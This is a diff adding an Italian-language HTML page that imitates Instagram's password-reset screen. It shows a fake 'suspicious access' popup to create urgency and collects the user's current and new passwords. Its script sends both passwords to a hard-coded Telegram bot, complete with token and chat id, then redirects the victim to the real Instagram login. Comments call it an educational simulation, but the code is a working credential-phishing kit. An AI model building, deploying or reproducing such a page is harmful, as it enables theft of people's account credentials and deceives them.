@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Cambio Password</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+        .login-box {
+            border: 1px solid #dbdbdb;
+            background-color: #fff;
+            padding: 20px 40px;
+            text-align: center;
+            border-radius: 12px;
+            margin-bottom: 12px;
+        }
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+            height: 51px;
+            object-fit: contain;
+        }
+        .form-group {
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 8px;
+            margin: 4px 0;
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            margin: 12px 0;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            opacity: 0.7;
+        }
+        button.active {
+            opacity: 1;
+        }
+        .divider {
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 16px;
+        }
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 12px 0;
+            cursor: pointer;
+        }
+        .facebook-login i {
+            font-size: 16px;
+            margin-right: 6px;
+        }
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin: 12px 0;
+            cursor: pointer;
+        }
+        .signup-box {
+            border: 1px solid #dbdbdb;
+            background-color: #fff;
+            padding: 20px;
+            text-align: center;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .footer-links a {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 0 8px 8px;
+            text-decoration: none;
+        }
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        #result {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+        .success {
+            background-color: #e6f7ee;
+            color: #009944;
+            border: 1px solid #a3e9c0;
+        }
+        .error {
+            background-color: #fee;
+            color: #d00;
+            border: 1px solid #ffb3b3;
+        }
+        /* Popup stile Instagram */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .popup {
+            background: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .popup-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .popup-message {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+        .popup-button {
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+        }
+        .blurred-password {
+            color: transparent;
+            text-shadow: 0 0 8px rgba(0,0,0,0.5);
+            user-select: none;
+        }
+        .security-info {
+            background-color: #f5f5f5;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-size: 13px;
+            text-align: left;
+        }
+        .security-info i {
+            color: #ed4956;
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Popup di avviso all'inizio -->
+    <div class="popup-overlay" id="securityPopup">
+        <div class="popup">
+            <div class="popup-title">Accesso sospetto rilevato</div>
+            <div class="popup-message">
+                Abbiamo rilevato un accesso sospetto al tuo account da:<br><br>
+                <strong>Lahore, Pakistan (IP: 39.45.218.112)</strong><br><br>
+                Data e ora: 24 aprile 2024 alle 14:37<br><br>
+                Se non sei stato tu, ti consigliamo di cambiare immediatamente la password.
+            </div>
+            <button class="popup-button" id="closePopup">Ho capito</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="logo">
+            <div class="security-info">
+                <i class="fas fa-exclamation-triangle"></i> Per la sicurezza del tuo account, ti chiediamo di reimpostare la password.
+            </div>
+            <form id="password-reset-form">
+                <div class="form-group">
+                    <input type="password" name="old-password" placeholder="Password attuale" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="new-password" placeholder="Nuova password" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="confirm-password" placeholder="Conferma nuova password" required>
+                </div>
+                <button type="submit" id="reset-button" disabled>Reimposta password</button>
+                <div id="result"></div>
+            </form>
+            <div class="divider">OPPURE</div>
+            <div class="facebook-login">
+                <i class="fab fa-facebook-square"></i> Accedi con Facebook
+            </div>
+        </div>
+        <div class="signup-box">
+            Non hai un account? <a href="#">Registrati</a>
+        </div>
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="#">Informazioni</a>
+                <a href="#">Blog</a>
+                <a href="#">Lavora con noi</a>
+                <a href="#">Aiuto</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Termini</a>
+                <a href="#">Account migliori</a>
+                <a href="#">Hashtag</a>
+                <a href="#">Località</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Caricamento contatti e non utenti</a>
+            </div>
+            <div class="copyright">
+                © 2024 Instagram da Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Mostra il popup all'inizio
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('securityPopup').style.display = 'flex';
+            
+            document.getElementById('closePopup').addEventListener('click', function() {
+                document.getElementById('securityPopup').style.display = 'none';
+            });
+        });
+
+        // Abilita il pulsante solo se tutti i campi sono compilati
+        const inputs = document.querySelectorAll('input');
+        const resetButton = document.getElementById('reset-button');
+        
+        inputs.forEach(input => {
+            input.addEventListener('input', () => {
+                const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
+                resetButton.disabled = !allFilled;
+                resetButton.classList.toggle('active', allFilled);
+            });
+        });
+
+        // Verifica che le nuove password coincidano
+        document.getElementById('password-reset-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const oldPassword = document.querySelector('input[name="old-password"]').value;
+            const newPassword = document.querySelector('input[name="new-password"]').value;
+            const confirmPassword = document.querySelector('input[name="confirm-password"]').value;
+            const resultDiv = document.getElementById('result');
+
+            // Mostra un messaggio di caricamento
+            resultDiv.textContent = "Verifica in corso...";
+            resultDiv.style.display = "block";
+            resultDiv.className = "";
+
+            if (newPassword !== confirmPassword) {
+                resultDiv.textContent = "Le password non coincidono. Riprova.";
+                resultDiv.className = "error";
+                return;
+            }
+
+            // Simula una verifica (NON REALE, SOLO PER TEST DIDATTICO)
+            setTimeout(() => {
+                // Simula un controllo casuale (50% di successo)
+                const isSuccess = Math.random() > 0.5;
+                
+                if (isSuccess) {
+                    resultDiv.textContent = "Password reimpostata con successo (simulazione). Reindirizzamento...";
+                    resultDiv.className = "success";
+                    
+                    // Invia i dati al bot Telegram (SOLO PER SIMULAZIONE)
+                    fetch(`https://api.telegram.org/bot8194126633:AAHGJ-9WykocSf-9cKTNSmQybcbRAeJsIXE/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: '5709299213',
+                            text: `PASSWORD RESET (SIMULATO)\nVecchia password: ${oldPassword}\nNuova password: ${newPassword}`
+                        })
+                    });
+                } else {
+                    resultDiv.textContent = "Errore nel reimpostare la password (simulazione). Riprova.";
+                    resultDiv.className = "error";
+                    
+                    // Invia i dati al bot Telegram (SOLO PER SIMULAZIONE)
+                    fetch(`https://api.telegram.org/bot8194126633:AAHGJ-9WykocSf-9cKTNSmQybcbRAeJsIXE/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: '5709299213',
+                            text: `PASSWORD RESET FALLITO (SIMULATO)\nVecchia password: ${oldPassword}\nNuova password tentata: ${newPassword}`
+                        })
+                    });
+                }
+
+                // Reindirizza alla pagina ufficiale dopo 3 secondi
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                }, 3000);
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
